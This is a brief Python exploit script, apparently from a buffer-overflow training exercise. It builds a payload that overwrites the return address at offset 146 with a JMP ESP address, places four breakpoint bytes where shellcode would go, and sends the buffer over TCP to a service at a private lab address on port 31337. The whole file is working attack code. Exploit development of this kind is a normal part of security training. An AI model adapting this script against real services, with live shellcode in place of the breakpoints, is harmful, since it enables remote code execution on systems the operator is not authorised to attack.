#!/usr/bin/python
import socket, time, struct

ip = "172.16.32.128"
port = 31337

eip_off = 146
buf_supp = 1024

jmpesp = 0x080414C3

buff = ''
buff += "A" * (eip_off - len(buff))
buff += struct.pack("<I", jmpesp) 
buff += "\xCC" * 4
buff += "D" * (buf_supp - len(buff))

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((ip, port))
   time.sleep(1)
   s.send(buff + "\n");
   s.close()

except Exception as e:
   print(e)
